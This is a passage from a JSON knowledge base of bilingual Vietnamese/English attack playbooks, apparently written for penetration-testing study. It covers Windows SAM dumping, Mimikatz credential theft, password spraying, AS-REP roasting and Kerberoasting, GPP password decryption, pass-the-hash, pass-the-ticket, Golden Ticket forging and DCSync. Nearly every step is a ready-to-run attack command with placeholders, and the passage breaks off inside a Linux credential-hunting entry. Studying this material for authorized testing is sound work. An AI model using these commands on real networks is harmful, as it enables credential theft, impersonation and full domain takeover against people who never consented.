    "content": "## Playbook 19: Windows PrivEsc qua SAM/SYSTEM Backup 💻⬆️👑\n\n**Giả định:** Tìm thấy bản sao lưu SAM và SYSTEM có thể đọc.\n\n**Mục tiêu:** Trích xuất NTLM hashes và leo thang.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Vị trí Backup:**\n    ```powershell\n    dir C:\\Windows\\Repair\\SAM \n    dir C:\\Windows\\System32\\config\\RegBack\\* \n    ```\n   \n2.  **Sao chép Hives:** Copy các file SAM và SYSTEM vào thư mục có thể truy cập (ví dụ: `C:\\Users\\Public\\`).\n3.  **Tải Hives về Kali:** Sử dụng HTTP upload server hoặc SMB server trên Kali để tải file về.\n4.  **Dump Hashes Offline:**\n    ```bash\n    # Trên Kali\n    impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL \n    ```\n   \n5.  **Sử dụng Hash (Pass the Hash):** Lấy hash NTLM của Administrator hoặc user trong nhóm Admin.\n    * **Evil-WinRM:** `evil-winrm -i <target_ip> -u Administrator -H <NTHash>`\n    * **Psexec:** `impacket-psexec -hashes <LMHash>:<NTHash> Administrator@<target_ip>`\n6.  **Xác nhận Shell Admin/SYSTEM.**",
    "steps": [
      { "vi": "**Xác định Vị trí Backup:**", "en": "**Identify Backup Location:**", "command": "dir C:\\Windows\\Repair\\SAM; dir C:\\Windows\\System32\\config\\RegBack\\*" },
      { "vi": "**Sao chép Hives:** (ví dụ: vào C:\\Users\\Public\\)", "en": "**Copy Hives:** (e.g., to C:\\Users\\Public\\)" },
      { "vi": "**Tải Hives về Kali:** (Sử dụng HTTP/SMB upload)", "en": "**Download Hives to Kali:** (Using HTTP/SMB upload)" },
      { "vi": "**Dump Hashes Offline (Kali):**", "en": "**Dump Hashes Offline (Kali):**", "command": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL" },
      { "vi": "**Sử dụng Hash (PtH - Evil-WinRM):**", "en": "**Use Hash (PtH - Evil-WinRM):**", "command": "evil-winrm -i <target_ip> -u Administrator -H <NTHash>" },
      { "vi": "**Sử dụng Hash (PtH - Psexec):**", "en": "**Use Hash (PtH - Psexec):**", "command": "impacket-psexec -hashes <LMHash>:<NTHash> Administrator@<target_ip>" },
      { "vi": "**Xác nhận Shell Admin/SYSTEM.**", "en": "**Confirm Admin/SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_sam_system_dump", "dir", "copy", "file_transfer_http_download", "file_transfer_smb_download", "impacket-secretsdump", "evil-winrm_connection", "impacket-psexec", "password_cracking_pass_the_hash"]
  },
  "playbook_20_windows_postex_mimikatz": {
    "title": {
      "vi": "Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping",
      "en": "Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping"
    },
    "assumption": "Đã có shell Administrator hoặc SYSTEM trên máy Windows.",
    "objective": "Dump credentials (plaintext, hashes, Kerberos tickets) từ bộ nhớ LSASS và SAM.",
    "tools": ["mimikatz"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "LSASS Dumping", "SAM Dumping"],
    "targets": ["LSASS", "SAM Database", "Kerberos Tickets"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "mimikatz", "credential dumping", "lsass", "sam", "kerberos tickets", "sekurlsa::logonpasswords", "lsadump::sam"], // Bỏ 'sekurlsa::tickets' khỏi tags vì nó là lệnh
    "content": "## Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping 🕵️‍♀️🔑\n\n**Giả định:** Có shell Admin/SYSTEM.\n\n**Mục tiêu:** Dump credentials từ LSASS và SAM.\n\n**Các bước thực hiện:**\n\n1.  **Tải Mimikatz lên:** Chuyển `mimikatz.exe` lên target (ví dụ: `C:\\Windows\\Temp\\`).\n2.  **Chạy Mimikatz và Dump:**\n    ```powershell\n    cd C:\\Windows\\Temp\\\n    .\\mimikatz.exe\n    privilege::debug \n    token::elevate # Nếu chưa là SYSTEM\n    sekurlsa::logonpasswords # Dump từ LSASS (có thể có plaintext)\n    lsadump::sam # Dump NTLM hash từ SAM\n    sekurlsa::tickets /export # Dump Kerberos tickets (dạng .kirbi)\n    exit\n    ```\n   \n3.  **Phân tích Kết quả:** Lưu lại toàn bộ output. Tìm kiếm plaintext passwords, NTLM hashes của các user quan trọng (admins, service accounts), và Kerberos tickets có thể dùng cho Pass the Ticket.",
    "steps": [
      { "vi": "**Tải Mimikatz lên Target:** (ví dụ: C:\\Windows\\Temp\\)", "en": "**Upload Mimikatz to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**Chạy Mimikatz:**", "en": "**Run Mimikatz:**", "command": ".\\mimikatz.exe" },
      { "vi": "(Mimikatz) Bật Debug Privilege:", "en": "(Mimikatz) Enable Debug Privilege:", "command": "privilege::debug" },
      { "vi": "(Mimikatz) Elevate Token (nếu cần):", "en": "(Mimikatz) Elevate Token (if needed):", "command": "token::elevate" },
      { "vi": "(Mimikatz) Dump LSASS:", "en": "(Mimikatz) Dump LSASS:", "command": "sekurlsa::logonpasswords" },
      { "vi": "(Mimikatz) Dump SAM:", "en": "(Mimikatz) Dump SAM:", "command": "lsadump::sam" },
      { "vi": "(Mimikatz) Dump Kerberos Tickets:", "en": "(Mimikatz) Dump Kerberos Tickets:", "command": "sekurlsa::tickets /export" },
      { "vi": "(Mimikatz) Thoát:", "en": "(Mimikatz) Exit:", "command": "exit" },
      { "vi": "**Phân tích Kết quả:** Tìm plaintext, NTLM hashes, Kerberos tickets.", "en": "**Analyze Results:** Look for plaintext, NTLM hashes, Kerberos tickets." }
    ],
    "related_knowledge_ids": ["mimikatz_credential_dumping", "password_cracking_ntlm_mimikatz", "ad_auth_cached_creds_mimikatz", "sekurlsa::logonpasswords", "lsadump::sam", "sekurlsa::tickets", "ad_attack_pass_the_ticket"]
  },
  "playbook_21_ad_foothold_spray": {
    "title": {
      "vi": "Playbook 21: AD Initial Access via Password Spraying",
      "en": "Playbook 21: AD Initial Access via Password Spraying"
    },
    "assumption": "Đã xác định được một danh sách username Active Directory hợp lệ (từ OSINT, enum SMB/LDAP) và một mật khẩu yếu/phổ biến (ví dụ: `Summer2025!`).",
    "objective": "Tìm ít nhất một cặp credential hợp lệ trong domain bằng password spraying.",
    "tools": ["crackmapexec", "kerbrute"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Password Spraying"],
    "targets": ["Active Directory Accounts", "SMB", "Kerberos"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "initial access", "password spraying", "crackmapexec", "kerbrute"],
    "content": "## Playbook 21: AD Initial Access via Password Spraying 🏢🔑\n\n**Giả định:** Có danh sách user AD và một mật khẩu yếu/phổ biến để thử.\n\n**Mục tiêu:** Tìm credential hợp lệ.\n\n**Các bước thực hiện:**\n\n1.  **Kiểm tra Chính sách Lockout:** Nếu có thể, kiểm tra ngưỡng lockout (`net accounts /domain` trên máy đã join domain).\n2.  **Password Spraying:**\n    * **CrackMapExec (SMB):**\n      ```bash\n      crackmapexec smb <DC_IP_or_Subnet> -u users.txt -p 'Summer2025!' -d <domain.local> --continue-on-success\n      ```\n     \n    * **Kerbrute (Kerberos):**\n      ```bash\n      kerbrute passwordspray -d <domain.local> users.txt 'Summer2025!'\n      ```\n     \n3.  **Xác nhận Credential:** Nếu tìm thấy tài khoản hợp lệ (ví dụ: `[+] ... SUCCESS`), thử đăng nhập bằng `crackmapexec`, `evil-winrm`, hoặc `psexec` để xác nhận.",
    "steps": [
      { "vi": "**Kiểm tra Chính sách Lockout:** (Nếu có thể)", "en": "**Check Lockout Policy:** (If possible)", "command": "net accounts /domain" },
      { "vi": "**Password Spraying (CrackMapExec - SMB):**", "en": "**Password Spraying (CrackMapExec - SMB):**", "command": "crackmapexec smb <DC_IP_or_Subnet> -u users.txt -p 'Summer2025!' -d <domain.local> --continue-on-success" },
      { "vi": "**Password Spraying (Kerbrute - Kerberos):**", "en": "**Password Spraying (Kerbrute - Kerberos):**", "command": "kerbrute passwordspray -d <domain.local> users.txt 'Summer2025!'" },
      { "vi": "**Xác nhận Credential:** Thử đăng nhập với creds tìm được.", "en": "**Confirm Credential:** Attempt login with found creds." }
    ],
    "related_knowledge_ids": ["ad_attack_password_spraying", "net accounts", "crackmapexec", "ad_attack_password_spraying_ad", "ad_lateral_movement_crackmapexec", "kerbrute"]
  },
  "playbook_22_ad_attack_asrep_roast": {
    "title": {
      "vi": "Playbook 22: AD Attack - AS-REP Roasting",
      "en": "Playbook 22: AD Attack - AS-REP Roasting"
    },
    "assumption": "Có khả năng truy vấn AD (ví dụ: shell user trên máy đã join domain, hoặc creds user thường). Enumeration (PowerView `Get-DomainUser -PreauthNotRequired`) phát hiện user không yêu cầu Kerberos pre-authentication.",
    "objective": "Lấy và crack hash AS-REP của user để có mật khẩu plaintext.",
    "tools": ["impacket-GetNPUsers", "Rubeus", "hashcat", "PowerView"],
    "phases": ["Credential Access"],
    "techniques": ["AS-REP Roasting", "Kerberos Attack", "Offline Hash Cracking"],
    "targets": ["Active Directory User Accounts"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "asrep roasting", "kerberos", "preauthentication", "impacket-getnpusers", "rubeus", "hashcat", "powerview"],
    "content": "## Playbook 22: AD Attack - AS-REP Roasting 💔🔑\n\n**Giả định:** Phát hiện user không cần pre-authentication.\n\n**Mục tiêu:** Lấy và crack hash AS-REP.\n\n**Các bước thực hiện:**\n\n1.  **Tìm Users (PowerView):**\n    ```powershell\n    # Trên máy Windows đã join domain\n    Import-Module .\\PowerView.ps1 \n    Get-DomainUser -PreauthNotRequired \n    ```\n   \n2.  **Lấy Hash (impacket-GetNPUsers):**\n    ```bash\n    # Từ Kali\n    impacket-GetNPUsers <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -usersfile <target_users.txt> -format hashcat -outputfile asrep.hashes \n    ```\n   \n3.  **Lấy Hash (Rubeus):**\n    ```powershell\n    # Từ Windows\n    .\\Rubeus.exe asreproast /outfile:asrep.hashes /format:hashcat \n    ```\n   \n4.  **Crack Hash (Hashcat):**\n    ```bash\n    # Trên Kali\n    hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \n    ```\n   \n5.  **Sử dụng Mật khẩu.**",
    "steps": [
      { "vi": "**Tìm Users (PowerView):**", "en": "**Find Users (PowerView):**", "command": "Import-Module .\\PowerView.ps1; Get-DomainUser -PreauthNotRequired" },
      { "vi": "**Lấy Hash (impacket-GetNPUsers - Kali):**", "en": "**Get Hash (impacket-GetNPUsers - Kali):**", "command": "impacket-GetNPUsers <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -usersfile <target_users.txt> -format hashcat -outputfile asrep.hashes" },
      { "vi": "**Lấy Hash (Rubeus - Windows):**", "en": "**Get Hash (Rubeus - Windows):**", "command": ".\\Rubeus.exe asreproast /outfile:asrep.hashes /format:hashcat" },
      { "vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt" },
      { "vi": "**Sử dụng Mật khẩu.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_asrep_roasting", "PowerView", "ad_pentest_enum_powerview", "impacket-GetNPUsers", "impacket_getnpusers", "Rubeus", "ad_attack_asrep_roasting_ad", "hashcat", "mode_18200"]
  },
  "playbook_23_ad_attack_kerberoast": {
    "title": {
      "vi": "Playbook 23: AD Attack - Kerberoasting",
      "en": "Playbook 23: AD Attack - Kerberoasting"
    },
    "assumption": "Có khả năng truy vấn AD (shell user hoặc creds user thường). Enumeration (PowerView `Get-NetUser -SPN`, BloodHound) phát hiện user account (không phải computer account) có Service Principal Name (SPN) được cấu hình.",
    "objective": "Lấy và crack hash TGS của service account để có mật khẩu plaintext.",
    "tools": ["impacket-GetUserSPNs", "Rubeus", "hashcat", "PowerView", "BloodHound"],
    "phases": ["Credential Access"],
    "techniques": ["Kerberoasting", "Kerberos Attack", "Offline Hash Cracking"],
    "targets": ["Active Directory Service Accounts"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "kerberoasting", "kerberos", "spn", "tgs", "impacket-getuserspns", "rubeus", "hashcat", "powerview", "bloodhound"],
    "content": "## Playbook 23: AD Attack - Kerberoasting 🔥🔑\n\n**Giả định:** Phát hiện user account có SPN.\n\n**Mục tiêu:** Lấy và crack hash TGS.\n\n**Các bước thực hiện:**\n\n1.  **Tìm Users (PowerView):**\n    ```powershell\n    # Trên máy Windows đã join domain\n    Import-Module .\\PowerView.ps1 \n    Get-NetUser -SPN | select samaccountname,serviceprincipalname \n    ```\n   \n    * Hoặc tìm trong BloodHound.\n2.  **Lấy Hash (impacket-GetUserSPNs):**\n    ```bash\n    # Từ Kali\n    impacket-GetUserSPNs <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -outputfile krb_tgs.hashes \n    ```\n   \n3.  **Lấy Hash (Rubeus):**\n    ```powershell\n    # Từ Windows\n    .\\Rubeus.exe kerberoast /outfile:krb_tgs.hashes /format:hashcat \n    ```\n   \n4.  **Crack Hash (Hashcat):**\n    ```bash\n    # Trên Kali\n    hashcat -m 13100 krb_tgs.hashes /usr/share/wordlists/rockyou.txt \n    ```\n   \n5.  **Sử dụng Mật khẩu.**",
    "steps": [
      { "vi": "**Tìm Users (PowerView):**", "en": "**Find Users (PowerView):**", "command": "Import-Module .\\PowerView.ps1; Get-NetUser -SPN | select samaccountname,serviceprincipalname" },
      { "vi": "**Lấy Hash (impacket-GetUserSPNs - Kali):**", "en": "**Get Hash (impacket-GetUserSPNs - Kali):**", "command": "impacket-GetUserSPNs <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -outputfile krb_tgs.hashes" },
      { "vi": "**Lấy Hash (Rubeus - Windows):**", "en": "**Get Hash (Rubeus - Windows):**", "command": ".\\Rubeus.exe kerberoast /outfile:krb_tgs.hashes /format:hashcat" },
      { "vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 13100 krb_tgs.hashes /usr/share/wordlists/rockyou.txt" },
      { "vi": "**Sử dụng Mật khẩu.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_kerberoasting", "PowerView", "ad_enum_spn", "impacket-GetUserSPNs", "impacket_getuserspns", "Rubeus", "ad_attack_kerberoasting_ad", "hashcat", "mode_13100"]
  },
  "playbook_24_ad_attack_gpp_decrypt": {
    "title": {
      "vi": "Playbook 24: AD Attack - GPP Password Decryption",
      "en": "Playbook 24: AD Attack - GPP Password Decryption"
    },
    "assumption": "Có quyền đọc SYSVOL share trên Domain Controller (thường là mọi user domain đều có). Đã tìm thấy file XML (ví dụ: `Groups.xml`) trong `Policies` chứa thuộc tính `cpassword`.",
    "objective": "Giải mã mật khẩu `cpassword` để có mật khẩu plaintext (thường là của local administrator).",
    "tools": ["smbclient", "grep", "gpp-decrypt", "crackmapexec"],
    "phases": ["Credential Access"],
    "techniques": ["GPP Password Abuse", "SYSVOL Enumeration"],
    "targets": ["Group Policy Preferences", "SYSVOL"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "gpp", "cpassword", "sysvol", "group policy", "gpp-decrypt", "crackmapexec"],
    "content": "## Playbook 24: AD Attack - GPP Password Decryption 📜🔑\n\n**Giả định:** Có quyền đọc SYSVOL và tìm thấy `cpassword` trong file XML.\n\n**Mục tiêu:** Giải mã `cpassword`.\n\n**Các bước thực hiện:**\n\n1.  **Truy cập và Tìm kiếm SYSVOL:**\n    * **Tìm file XML:**\n      ```bash\n      # Trên Kali\n      smbclient \\\\<DC_IP>\\SYSVOL -U '<domain>\\<user>%<pass>'\n      # Bên trong smbclient:\n      cd <domain>\\Policies\\\n      recurse ON\n      prompt OFF\n      mget *.xml \n      exit\n      ```\n     \n    * **Tìm `cpassword`:**\n      ```bash\n      grep -i cpassword *.xml \n      ```\n     \n    * **Hoặc dùng CrackMapExec Module:**\n      ```bash\n      crackmapexec smb <DC_IP> -u <user> -p '<pass>' -M gpp_password \n      ```\n     \n2.  **Giải mã:**\n    ```bash\n    # Trên Kali\n    gpp-decrypt \"<copied_cpassword_value>\" \n    ```\n   \n3.  **Sử dụng Mật khẩu:** Mật khẩu plaintext thường là của local administrator.",
    "steps": [
      { "vi": "**Truy cập SYSVOL và tải XML (smbclient):**", "en": "**Access SYSVOL and download XML (smbclient):**", "command": "smbclient \\\\<DC_IP>\\SYSVOL -U '<domain>\\<user>%<pass>' -c 'cd <domain>\\Policies\\; recurse ON; prompt OFF; mget *.xml; exit'" },
      { "vi": "**Tìm `cpassword` (grep):**", "en": "**Find `cpassword` (grep):**", "command": "grep -i cpassword *.xml" },
      { "vi": "**Hoặc Tìm `cpassword` (CrackMapExec):**", "en": "**Or Find `cpassword` (CrackMapExec):**", "command": "crackmapexec smb <DC_IP> -u <user> -p '<pass>' -M gpp_password" },
      { "vi": "**Giải mã (gpp-decrypt):**", "en": "**Decrypt (gpp-decrypt):**", "command": "gpp-decrypt \"<copied_cpassword_value>\"" },
      { "vi": "**Sử dụng Mật khẩu.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_gpp_cpassword", "smbclient", "ad_enum_domain_shares_gpp", "grep", "gpp-decrypt", "crackmapexec"]
  },
  "playbook_25_ad_lateral_pth": {
    "title": {
      "vi": "Playbook 25: AD Lateral Movement - Pass the Hash (PtH)",
      "en": "Playbook 25: AD Lateral Movement - Pass the Hash (PtH)"
    },
    "assumption": "Đã dump được NTLM hash của một user (ví dụ: Administrator, Domain Admin, hoặc user có quyền Local Admin trên máy mục tiêu) từ LSASS/SAM/NTDS.dit. Máy mục tiêu có SMB (445) hoặc WinRM (5985) mở và có thể truy cập được (có thể cần pivot).",
    "objective": "Giành quyền truy cập shell trên máy mục tiêu bằng NTLM hash.",
    "tools": ["impacket-psexec", "impacket-wmiexec", "evil-winrm", "mimikatz"],
    "phases": ["Lateral Movement"],
    "techniques": ["Pass the Hash (PtH)"],
    "targets": ["Windows Machine"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "lateral movement", "pass the hash", "pth", "ntlm hash", "impacket", "psexec", "wmiexec", "evil-winrm", "mimikatz"],
    "content": "## Playbook 25: AD Lateral Movement - Pass the Hash (PtH) 🚶‍♂️🔑➡️💻\n\n**Giả định:** Có NTLM hash và máy mục tiêu có SMB/WinRM mở, truy cập được.\n\n**Mục tiêu:** Giành shell trên máy mục tiêu bằng hash.\n\n**Các bước thực hiện:**\n\n1.  **Chọn Công cụ và Giao thức:**\n    * **Psexec (SMB - SYSTEM shell):**\n      ```bash\n      impacket-psexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>\n      ```\n    * **Wmiexec (WMI - user shell):**\n      ```bash\n      impacket-wmiexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>\n      ```\n    * **Evil-WinRM (WinRM):**\n      ```bash\n      evil-winrm -i <target_ip> -u <user> -H <NTHash>\n      ```\n    * **Mimikatz (Từ Windows khác):**\n      ```powershell\n      privilege::debug\n      sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:cmd.exe\n      dir \\\\<target_ip>\\C$\n      ```\n   \n2.  **Thực thi Lệnh / Lấy Shell.**\n3.  **Xác nhận Quyền Truy cập.**",
    "steps": [
      { "vi": "**PtH với Psexec (SMB):**", "en": "**PtH with Psexec (SMB):**", "command": "impacket-psexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>" },
      { "vi": "**PtH với Wmiexec (WMI):**", "en": "**PtH with Wmiexec (WMI):**", "command": "impacket-wmiexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>" },
      { "vi": "**PtH với Evil-WinRM (WinRM):**", "en": "**PtH with Evil-WinRM (WinRM):**", "command": "evil-winrm -i <target_ip> -u <user> -H <NTHash>" },
      { "vi": "**PtH với Mimikatz (Windows):**", "en": "**PtH with Mimikatz (Windows):**", "command": "privilege::debug; sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:cmd.exe" },
      { "vi": "**Xác nhận Quyền Truy cập.**", "en": "**Confirm Access.**" }
    ],
    "related_knowledge_ids": ["pass_the_hash", "impacket-psexec", "impacket-wmiexec", "password_cracking_pass_the_hash", "evil_winrm_connection", "mimikatz"]
  },
  "playbook_26_ad_lateral_ptt": {
    "title": {
      "vi": "Playbook 26: AD Lateral Movement - Pass the Ticket (PtT)",
      "en": "Playbook 26: AD Lateral Movement - Pass the Ticket (PtT)"
    },
    "assumption": "Đã dump được Kerberos ticket (TGT hoặc TGS, thường là file `.kirbi`) từ LSASS (dùng Mimikatz `sekurlsa::tickets /export`).",
    "objective": "Sử dụng Kerberos ticket đã đánh cắp để xác thực và giành quyền truy cập.",
    "tools": ["mimikatz", "Rubeus"],
    "phases": ["Lateral Movement"],
    "techniques": ["Pass the Ticket (PtT)", "Kerberos Attack"],
    "targets": ["Windows Machine", "Kerberos Services (SMB, HTTP, etc.)"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "lateral movement", "pass the ticket", "ptt", "kerberos", "kirbi", "mimikatz", "rubeus"],
    "content": "## Playbook 26: AD Lateral Movement - Pass the Ticket (PtT) 🚶‍♂️🎫➡️💻\n\n**Giả định:** Có Kerberos ticket file (`.kirbi`).\n\n**Mục tiêu:** Sử dụng ticket để xác thực.\n\n**Các bước thực hiện:**\n\n1.  **Chuyển Ticket:** Tải file `.kirbi` lên máy Windows mà bạn đang có shell.\n2.  **Tiêm Ticket (Mimikatz):**\n    ```powershell\n    kerberos::ptt C:\\path\\to\\ticket.kirbi \n    ```\n   \n3.  **Tiêm Ticket (Rubeus - Base64):**\n    ```powershell\n    .\\Rubeus.exe ptt /ticket:<base64_ticket_string> \n    ```\n   \n4.  **Xác minh Ticket:** `klist`.\n5.  **Truy cập Tài nguyên:** Sử dụng ticket đã tiêm (ví dụ: `dir \\\\<server>\\C$`).",
    "steps": [
      { "vi": "**Chuyển Ticket (.kirbi) lên Target.**", "en": "**Transfer Ticket (.kirbi) to Target.**" },
      { "vi": "**Tiêm Ticket (Mimikatz):**", "en": "**Inject Ticket (Mimikatz):**", "command": "kerberos::ptt C:\\path\\to\\ticket.kirbi" },
      { "vi": "**Tiêm Ticket (Rubeus - Base64):**", "en": "**Inject Ticket (Rubeus - Base64):**", "command": ".\\Rubeus.exe ptt /ticket:<base64_ticket_string>" },
      { "vi": "**Xác minh Ticket:**", "en": "**Verify Ticket:**", "command": "klist" },
      { "vi": "**Truy cập Tài nguyên:** (ví dụ)", "en": "**Access Resource:** (example)", "command": "dir \\\\<target_server>\\C$" }
    ],
    "related_knowledge_ids": ["pass_the_ticket", "ad_attack_pass_the_ticket", "mimikatz", "kerberos::ptt", "Rubeus", "klist", "overpass_the_hash"]
  },
  "playbook_27_ad_persistence_golden_ticket": {
    "title": {
      "vi": "Playbook 27: AD Persistence - Golden Ticket",
      "en": "Playbook 27: AD Persistence - Golden Ticket"
    },
    "assumption": "Đã có NTLM hash của tài khoản `krbtgt` (thường lấy được qua DCSync hoặc dump NTDS.dit từ DC). Biết Domain Name và Domain SID.",
    "objective": "Tạo một Kerberos TGT giả mạo (Golden Ticket) để có thể mạo danh bất kỳ user nào trong domain và duy trì quyền truy cập.",
    "tools": ["mimikatz", "whoami"],
    "phases": ["Persistence", "Privilege Escalation"],
    "techniques": ["Golden Ticket", "Kerberos Attack"],
    "targets": ["Active Directory Domain"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "persistence", "golden ticket", "kerberos", "tgt", "krbtgt", "ntlm hash", "mimikatz", "dcsync"],
    "content": "## Playbook 27: AD Persistence - Golden Ticket 🎫👑\n\n**Giả định:** Có NTLM hash của `krbtgt`, biết Domain Name và SID.\n\n**Mục tiêu:** Tạo Golden Ticket để duy trì quyền truy cập DA.\n\n**Các bước thực hiện:**\n\n1.  **Thu thập Thông tin:** krbtgt Hash, Domain Name, Domain SID (`whoami /user`).\n2.  **Chạy Mimikatz (Admin).**\n3.  **Xóa Tickets cũ (Tùy chọn):** `kerberos::purge`.\n4.  **Tạo và Tiêm Golden Ticket:**\n    ```powershell\n    kerberos::golden /user:FakeAdmin /domain:<domain.local> /sid:<DomainSID> /krbtgt:<krbtgt_NTHash> /ptt \n    ```\n   \n5.  **Xác minh Ticket:** `klist`.\n6.  **Truy cập Tài nguyên:** `dir \\\\<DC_IP>\\C$ `.",
    "steps": [
      { "vi": "**Thu thập Thông tin:** krbtgt Hash, Domain Name, Domain SID.", "en": "**Gather Information:** krbtgt Hash, Domain Name, Domain SID.", "command": "whoami /user" },
      { "vi": "**Chạy Mimikatz (Admin).**", "en": "**Run Mimikatz (Admin).**" },
      { "vi": "**Xóa Tickets cũ (Tùy chọn):**", "en": "**Purge Old Tickets (Optional):**", "command": "kerberos::purge" },
      { "vi": "**Tạo và Tiêm Golden Ticket:**", "en": "**Create and Inject Golden Ticket:**", "command": "kerberos::golden /user:FakeAdmin /domain:<domain.local> /sid:<DomainSID> /krbtgt:<krbtgt_NTHash> /ptt" },
      { "vi": "**Xác minh Ticket:**", "en": "**Verify Ticket:**", "command": "klist" },
      { "vi": "**Truy cập Tài nguyên:** (ví dụ)", "en": "**Access Resource:** (example)", "command": "dir \\\\<DC_IP>\\C$" }
    ],
    "related_knowledge_ids": ["golden_ticket", "ad_attack_golden_ticket", "mimikatz", "dcsync", "whoami /user", "ad_attack_silver_ticket_ad", "kerberos::purge", "kerberos::golden", "klist", "ad_attack_pass_the_ticket", "overpass_the_hash"]
  },
  "playbook_28_ad_compromise_dcsync": {
    "title": {
      "vi": "Playbook 28: AD Domain Compromise via DCSync",
      "en": "Playbook 28: AD Domain Compromise via DCSync"
    },
    "assumption": "Đã có quyền của một user thuộc nhóm có quyền Directory Replication (thường là Domain Admins, Enterprise Admins, Administrators, hoặc user được ủy quyền đặc biệt).",
    "objective": "Sử dụng DCSync để dump NTLM hash của các tài khoản quan trọng (đặc biệt là `krbtgt`) từ Domain Controller.",
    "tools": ["mimikatz", "impacket-secretsdump"],
    "phases": ["Credential Access", "Privilege Escalation"],
    "techniques": ["DCSync", "Directory Replication Abuse"],
    "targets": ["Domain Controller", "Active Directory Accounts"],
    "os": ["Windows", "Any"],
    "tags": ["ad", "active directory", "dcsync", "replication", "credential dumping", "ntlm hash", "krbtgt", "mimikatz", "impacket-secretsdump", "domain admin"],
    "content": "## Playbook 28: AD Domain Compromise via DCSync 🔑🏰\n\n**Giả định:** Có quyền Replication.\n\n**Mục tiêu:** Dump hash (đặc biệt là `krbtgt`) từ DC.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Quyền.**\n2.  **Thực hiện DCSync (Mimikatz):**\n    ```powershell\n    lsadump::dcsync /domain:<domain.local> /user:krbtgt \n    ```\n   \n3.  **Thực hiện DCSync (impacket-secretsdump):**\n    ```bash\n    impacket-secretsdump <domain.local>/<UserWithRights>:<Password>@<DC_IP> -just-dc-user krbtgt \n    ```\n   \n4.  **Lưu Hash.**\n5.  **Sử dụng Hash:** Golden Ticket (Playbook 27) hoặc PtH (Playbook 25).",
    "steps": [
      { "vi": "**Xác nhận Quyền Replication.**", "en": "**Confirm Replication Rights.**" },
      { "vi": "**Thực hiện DCSync (Mimikatz):** (Dump krbtgt)", "en": "**Perform DCSync (Mimikatz):** (Dump krbtgt)", "command": "lsadump::dcsync /domain:<domain.local> /user:krbtgt" },
      { "vi": "**Thực hiện DCSync (impacket-secretsdump):** (Dump krbtgt)", "en": "**Perform DCSync (impacket-secretsdump):** (Dump krbtgt)", "command": "impacket-secretsdump <domain.local>/<UserWithRights>:<Password>@<DC_IP> -just-dc-user krbtgt" },
      { "vi": "**Lưu Hash.**", "en": "**Save Hashes.**" },
      { "vi": "**Sử dụng Hash:** Golden Ticket (Playbook 27) hoặc PtH (Playbook 25).", "en": "**Use Hashes:** Golden Ticket (Playbook 27) or PtH (Playbook 25)." }
    ],
    "related_knowledge_ids": ["dcsync", "ad_attack_dcsync", "mimikatz", "lsadump::dcsync", "mimikatz_dcsync", "impacket-secretsdump", "ad_attack_dump_ntdsdit"]
  },
  "playbook_29_postex_linux_creds": {
    "title": {
      "vi": "Playbook 29: Linux Post-Exploitation - Credential Hunting Focus",
      "en": "Playbook 29: Linux Post-Exploitation - Credential Hunting Focus"
    },
    "assumption": "Đã có quyền root trên máy Linux.",
    "objective": "Tìm kiếm chuyên sâu các credentials (mật khẩu plaintext, hash, khóa SSH) để di chuyển ngang.",
    "tools": ["grep", "find", "cat", "history"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Hunting"],
    "targets": ["Configuration Files", "Shell History", "SSH Keys", "/etc/shadow"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "credential hunting", "grep", "find", "history", "ssh keys", "etc/shadow", "plaintext password"],
